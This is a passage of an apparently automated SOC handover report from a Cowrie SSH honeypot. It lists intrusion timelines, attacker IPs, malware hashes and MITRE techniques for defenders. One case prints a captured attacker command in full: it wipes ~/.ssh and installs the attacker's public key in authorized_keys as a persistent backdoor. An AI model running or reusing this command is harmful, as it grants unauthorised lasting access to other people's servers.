| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:58:42` | `cowrie.session.connect` |
| `2026-04-14 20:58:42` | `cowrie.client.version` |
| `2026-04-14 20:58:43` | `cowrie.client.kex` |
| `2026-04-14 20:58:43` | `cowrie.login.success` |
| `2026-04-14 20:58:44` | `cowrie.session.params` |
| `2026-04-14 20:58:44` | `cowrie.command.input` |
| `2026-04-14 20:58:44` | `cowrie.command.failed` |
| `2026-04-14 20:58:44` | `cowrie.log.closed` |
| `2026-04-14 20:58:44` | `cowrie.session.params` |
| `2026-04-14 20:58:44` | `cowrie.command.input` |
| `2026-04-14 20:58:45` | `cowrie.session.file_download` |
| `2026-04-14 20:58:45` | `cowrie.log.closed` |
| `2026-04-14 20:58:53` | `cowrie.session.params` |
| `2026-04-14 20:58:53` | `cowrie.command.input` |
| `2026-04-14 20:58:53` | `cowrie.log.closed` |
| `2026-04-14 20:58:54` | `cowrie.session.params` |
| `2026-04-14 20:58:54` | `cowrie.command.input` |
| `2026-04-14 20:58:54` | `cowrie.log.closed` |
| `2026-04-14 20:58:54` | `cowrie.session.params` |
| `2026-04-14 20:58:54` | `cowrie.command.input` |
| `2026-04-14 20:58:54` | `cowrie.session.file_download` |
| `2026-04-14 20:58:54` | `cowrie.log.closed` |
| `2026-04-14 20:58:55` | `cowrie.session.params` |
| `2026-04-14 20:58:55` | `cowrie.command.input` |
| `2026-04-14 20:58:55` | `cowrie.log.closed` |
| `2026-04-14 20:58:55` | `cowrie.session.params` |
| `2026-04-14 20:58:55` | `cowrie.command.input` |
| `2026-04-14 20:58:56` | `cowrie.log.closed` |
| `2026-04-14 20:58:56` | `cowrie.session.params` |
| `2026-04-14 20:58:56` | `cowrie.command.input` |
| `2026-04-14 20:58:56` | `cowrie.command.input` |
| `2026-04-14 20:58:56` | `cowrie.log.closed` |
| `2026-04-14 20:58:57` | `cowrie.session.params` |
| `2026-04-14 20:58:57` | `cowrie.command.input` |
| `2026-04-14 20:58:57` | `cowrie.log.closed` |
| `2026-04-14 20:58:57` | `cowrie.session.params` |
| `2026-04-14 20:58:57` | `cowrie.command.input` |
| `2026-04-14 20:58:57` | `cowrie.log.closed` |
| `2026-04-14 20:58:58` | `cowrie.session.params` |
| `2026-04-14 20:58:58` | `cowrie.command.input` |
| `2026-04-14 20:58:58` | `cowrie.log.closed` |
| `2026-04-14 20:58:58` | `cowrie.session.params` |
| `2026-04-14 20:58:58` | `cowrie.command.input` |
| `2026-04-14 20:58:58` | `cowrie.log.closed` |
| `2026-04-14 20:58:59` | `cowrie.session.params` |
| `2026-04-14 20:58:59` | `cowrie.command.input` |
| `2026-04-14 20:58:59` | `cowrie.log.closed` |
| `2026-04-14 20:58:59` | `cowrie.session.params` |
| `2026-04-14 20:58:59` | `cowrie.command.input` |
| `2026-04-14 20:59:00` | `cowrie.log.closed` |
| `2026-04-14 20:59:00` | `cowrie.session.params` |
| `2026-04-14 20:59:00` | `cowrie.command.input` |
| `2026-04-14 20:59:00` | `cowrie.log.closed` |
| `2026-04-14 20:59:01` | `cowrie.session.params` |
| `2026-04-14 20:59:01` | `cowrie.command.input` |
| `2026-04-14 20:59:01` | `cowrie.log.closed` |
| `2026-04-14 20:59:01` | `cowrie.session.params` |
| `2026-04-14 20:59:01` | `cowrie.command.input` |
| `2026-04-14 20:59:01` | `cowrie.log.closed` |
| `2026-04-14 20:59:02` | `cowrie.session.params` |
| `2026-04-14 20:59:02` | `cowrie.command.input` |
| `2026-04-14 20:59:02` | `cowrie.log.closed` |
| `2026-04-14 20:59:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b28559d231

| Field | Detail |
|---|---|
| **Source IP** | `172.185.24[.]228` |
| **First Seen** | 2026-04-14 20:59 |
| **Last Seen** | 2026-04-14 20:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 20:59:07` | `cowrie.session.connect` |
| `2026-04-14 20:59:07` | `cowrie.client.version` |
| `2026-04-14 20:59:07` | `cowrie.client.kex` |
| `2026-04-14 20:59:08` | `cowrie.login.success` |
| `2026-04-14 20:59:08` | `cowrie.session.params` |
| `2026-04-14 20:59:08` | `cowrie.command.input` |
| `2026-04-14 20:59:08` | `cowrie.command.failed` |
| `2026-04-14 20:59:08` | `cowrie.log.closed` |
| `2026-04-14 20:59:09` | `cowrie.session.params` |
| `2026-04-14 20:59:09` | `cowrie.command.input` |
| `2026-04-14 20:59:09` | `cowrie.session.file_download` |
| `2026-04-14 20:59:09` | `cowrie.log.closed` |

**Recommended Actions:**
- [ ] Submit `172.185.24[.]228` to AbuseIPDB if not already reported
- [ ] Block `172.185.24[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.83[.]70` | **20** | 2026-04-14 20:33 | 2026-04-14 20:58 | 28m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.185.24[.]228` | **16** | 2026-04-14 20:30 | 2026-04-14 20:59 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.250.89[.]44` | **15** | 2026-04-14 20:54 | 2026-04-14 20:59 | 12m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.114.8[.]57` | **11** | 2026-04-14 20:32 | 2026-04-14 20:58 | 18m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.145[.]231` | **2** | 2026-04-14 20:52 | 2026-04-14 20:57 | 2m | 0 | `T1592` | 🟢 LOW |
| `14.103.73[.]80` | **2** | 2026-04-14 20:54 | 2026-04-14 20:58 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.96.43[.]148` | **2** | 2026-04-14 20:54 | 2026-04-14 20:57 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.29.255[.]113` | 1 | 2026-04-14 20:28 | 2026-04-14 20:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.183.74[.]214` | 1 | 2026-04-14 20:54 | 2026-04-14 20:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.174.82[.]77` | 1 | 2026-04-14 20:55 | 2026-04-14 20:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.255.159[.]152` | 1 | 2026-04-14 20:32 | 2026-04-14 20:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.156.129[.]246` | 1 | 2026-04-14 20:52 | 2026-04-14 20:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.91.33[.]72` | 1 | 2026-04-14 20:53 | 2026-04-14 20:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.106.80[.]16` | 1 | 2026-04-14 20:30 | 2026-04-14 20:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `76.79.213[.]70` | 1 | 2026-04-14 20:30 | 2026-04-14 20:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `122.114.8[.]57` | CN | Zhengzhou GIANT Computer Network Technology Co., Ltd | **100** ⚠️ | 4 |
| `101.29.255[.]113` | CN | China Unicom Hebei province network | **100** ⚠️ | 6 |
| `107.174.82[.]77` | US | HostPapa | **100** ⚠️ | 4 |
| `125.91.33[.]72` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `124.156.129[.]246` | HK | Asia Pacific Network Information Centre | **100** ⚠️ | 8 |
| `180.106.80[.]16` | CN | Chinanet Jiangsu Province Network | **100** ⚠️ | 50 |
| `172.185.24[.]228` | US | Microsoft Limited | **100** ⚠️ | 50 |
| `116.255.159[.]152` | CN | Zhengzhou Gainet Computer Network Technology Co.,Ltd. | **100** ⚠️ | 50 |
| `76.79.213[.]70` | US | Charter Communications Inc | **100** ⚠️ | 47 |
| `14.103.73[.]80` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 106 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 30 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 30 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 109 cases |
| Tool 34  | Credential Extractor        | ✅ 60 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (2.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 30 priority case(s) shown individually · 15 recon entry/entries in table (7 group(s) consolidating 68 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-14T21:00:15Z_
